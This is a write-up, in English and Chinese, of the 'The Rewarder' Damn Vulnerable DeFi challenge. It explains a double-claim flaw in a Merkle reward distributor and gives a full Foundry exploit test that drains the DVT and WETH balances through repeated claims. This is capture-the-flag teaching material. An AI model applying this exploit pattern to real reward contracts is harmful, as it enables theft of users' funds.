# The Rewarder

A contract is distributing rewards of Damn Valuable Tokens and WETH.

To claim rewards, users must prove they're included in the chosen set of beneficiaries. Don't worry about gas though. The contract has been optimized and allows claiming multiple tokens in the same transaction.

Alice has claimed her rewards already. You can claim yours too! But you've realized there's a critical vulnerability in the contract.

Save as much funds as you can from the distributor. Transfer all recovered assets to the designated recovery account.


该合约正在分发Damn Valuable Token和WETH的奖励。

要领取奖励，用户必须证明他们被选入受益人集合。不过不用担心gas费用。合约已经进行了优化，允许在同一交易中领取多个代币。

爱丽丝已经领取了她的奖励。你也可以领取你的！但是你已经意识到合约中有一个关键的漏洞。

从分发者那里尽可能多地保存资金。将所有恢复的资产转移到指定的恢复账户。

# 漏洞代码
claimRewards函数中

```solidity 
//@audit-issue 奖励重复领取绕过（逻辑缺陷）
            if (token != inputTokens[inputClaim.tokenIndex]) {
                //@audit-issue token初始为0地址。
                //第一次进入循环时会跳过这里的逻辑，直到第二次进入循环时才会执行这里的逻辑，从而导致第一次领取记录无法被标记为已领取，从而可以重复领取奖励。
                if (address(token) != address(0)) {
                    if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
                }
```
所以我们只需要重复领取即可获得所有资金

# 攻击代码
```solidity
function test_theRewarder() public checkSolvedByPlayer {
        //读取DVT json
        string memory dvtJson = vm.readFile("test/the-rewarder/dvt-distribution.json");
        Reward[] memory dvtRewards = abi.decode(vm.parseJson(dvtJson), (Reward[]));
        //读取WETH json
        string memory wethJson = vm.readFile("test/the-rewarder/weth-distribution.json");
        Reward[] memory wethRewards = abi.decode(vm.parseJson(wethJson), (Reward[]));
        // 加载Merkle leaves
        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

        // 查找玩家的奖励金额和证明
        uint256 playerDvtAmount;
        bytes32[] memory playerDvtProof;
        uint256 playerWethAmount;
        bytes32[] memory playerWethProof;
        for (uint256 i = 0; i < dvtRewards.length; i++) {
            if (dvtRewards[i].beneficiary == player) {
                playerDvtAmount = dvtRewards[i].amount;
                playerWethAmount = wethRewards[i].amount;
                playerDvtProof = merkle.getProof(dvtLeaves, i);
                playerWethProof = merkle.getProof(wethLeaves, i);
                break;
            }
        }
        require(playerDvtAmount > 0, "Player not found in DVT distribution");
        require(playerWethAmount > 0, "Player not found in WETH distribution");

        // 设置要领取的代币
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        //计算利用漏洞要领取的总次数
        uint256 totalClaimsNeeded =
            (TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount) + (TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount);
        uint256 dvtClaims = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount;
        Claim[] memory claims = new Claim[](totalClaimsNeeded);

        for (uint256 i = 0; i < totalClaimsNeeded; i++) {
            claims[i] = Claim({
                batchNumber: 0,
                amount: i < dvtClaims ? playerDvtAmount : playerWethAmount,
                tokenIndex: i < dvtClaims ? 0 : 1,
                proof: i < dvtClaims ? playerDvtProof : playerWethProof
            });
        }

        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }
```

# 回顾知识
### Merkle Tree（默克尔树）：
一种数据结构，用于高效且安全地验证数据的完整性。它通过将数据分块并对每个块进行哈希处理，然后将这些哈希值两两组合并再次哈希，直到最终生成一个单一的哈希值，称为根哈希（Merkle Root）。这种结构允许用户只需提供少量的数据（Merkle Proof）即可验证某个数据块是否包含在整个数据集中，而无需下载整个数据集。

在代码中利用了openzeppelin的MerkleProof库来验证用户是否有资格领取奖励。

